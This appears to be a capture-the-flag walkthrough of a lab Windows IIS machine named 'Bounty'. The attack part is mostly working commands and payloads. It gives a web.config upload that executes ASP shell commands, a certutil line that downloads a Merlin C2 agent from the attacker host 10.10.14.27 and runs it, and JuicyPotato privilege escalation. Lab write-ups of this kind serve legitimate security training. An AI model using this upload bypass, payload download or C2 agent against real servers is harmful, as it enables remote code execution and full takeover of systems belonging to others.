### keyword

aspx upload bypass rce, merlin, juicepotato, gobuster

### information

Nmap 7.70 scan initiated Mon Mar 11 17:21:03 2019 as: nmap -sC -sV -oA nmap  bounty

Nmap scan report for bounty
Host is up (0.43s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Bounty
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

### enum the website

- test the website

  - firefox->http://bounty/a.aspx

    - Server Error in '/' Application.               *The resource cannot be found.*                              **Description:** HTTP 404. The resource you are looking  for (or one of its dependencies) could have been removed, had its name  changed, or is temporarily unavailable.  Please review the following URL  and make sure that it is spelled correctly.             

      Requested URL:/a.aspx

- gobuster -w  directory-list-2.3-medium.txt -u http://bounty  -x aspx

  - transfer.aspx
  - UploadedFiles

see the website 

![transfer.asp](https://raw.githubusercontent.com/Stenson00o/penetration_tools/master/images/transfer.aspx.png)

as the website, you can see this is a upload file web api, so we can teset the api,

what file can upload success! so direct to "**/usr/share/wordlists/SecLists# cat  ./Discovery/Web-Content/raft-small-extensions.txt **" and the we can use **burpsuite** **intruder**  plugin to spider the website, test what file we can upload successfully.

![spider](https://github.com/Stenson00o/penetration_tools/blob/master/images/testuploadextension1.png?raw=true)

![spider2](https://github.com/Stenson00o/penetration_tools/blob/master/images/testuploadextension2.png?raw=true)

as you see that, we can upload config, jpg, gif, swf, png. but maybe the  jpg, gif,swf can not be useful for us , because the image don't allow us to execute any code , exclude LFI(local file include). 

anyway, we can Google the  **aspx upload bypass with config , doc or something interesting**

here is an article about"**aspx upload bypass rce**"  [003Random’s Blog](https://poc-server.com/blog/2018/05/22/rce-by-uploading-a-web-config/) . this guys introduce the how to use "**web.config**"  to execute aspx script. such as:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
   <appSettings>
</appSettings>
</configuration>
<!–-
<% Response.write("-"&"->")
Response.write("<pre>")
Set wShell1 = CreateObject("WScript.Shell")
Set cmd1 = wShell1.Exec("whoami")
output1 = cmd1.StdOut.Readall()
set cmd1 = nothing: Set wShell1 = nothing
Response.write(output1)
Response.write("</pre><!-"&"-") %>
-–>
```

###  USE merlin

next step, we want to get the reverse shell by  [merlin](https://github.com/Ne0nd0g/merlin)  , execute the command in below:

- go get github.com/Ne0nd0g/merlin
- cd /opt; git clone https://github.com/Ne0nd0g/merlin.git
- cd /opt/merlin/data/x509; 
- openssl req -x509  -newkey rsa:4096  -nodes -keyout server.key -out server.crt -
  days 365  -subj '/CN=root'
- go run cmd/merlinserver/main.go (test if or not working!!)

###   compile  the  merlin agent for windows x64 exe

[Building or Running Merlin From Source Code](https://github.com/Ne0nd0g/merlin/wiki/Building-or-Running-from-Source#building-or-running-merlin-from-source-code) 

 GOOS=windows GOARCH=amd64  go build  -ldflags "-X main.url=https://10.10.1
4.27:443/" -o Agent.exe  main.go

start server:

go run cmd/merlinserver/main.go -i tun0



### download to the victim machine

certutil -urlcache -split -f http://server/agent.exe  c:\\users\\public\agent.exe

'''asp'''

<!---
<% Response.write("-"&"->")
Response.write("<pre>")
Set wShell1 = CreateObject("WScript.Shell")
Set cmd1 = wShell1.Exec("certutil.exe -urlcache -split -f http://10.10.14.27/agent.exe c:\\users\\public\agent.exe")
output1 = cmd1.StdOut.Readall()
set cmd1 = nothing: Set wShell1 = nothing
Response.write(output1)
Response.write("</pre><!-"&"-") %>
--->

execute the agent.exe

`<% Response.write("-"&"->")`
`Response.write("<pre>")`
`Set wShell1 = CreateObject("WScript.Shell")`
`Set cmd1 = wShell1.Exec("cmd /c c:\users\public\agent.exe")`
`output1 = cmd1.StdOut.Readall()`
`set cmd1 = nothing: Set wShell1 = nothing`
`Response.write(output1)`
`Response.write("</pre><!-"&"-") %>`
`-–>`

now we can see what the privilege we hava, **cmd whoami /priv**  in merlin

![privilege](https://github.com/Stenson00o/penetration_tools/blob/master/images/seimpertional.png?raw=true)



ok, now we can get be privilge by https://github.com/ohpe/juicy-potato

 upload  /root/htb/Bounty/www/jp.exe c://users//public//jp.exe

cmd c:\\users\\public\\jp.exe -t * -p "c:\\users\\public\\agent.exe" -l 9000

![bingo](https://github.com/Stenson00o/penetration_tools/blob/master/images/juicepotatoExecuteMerlinAgent.png?raw=true)

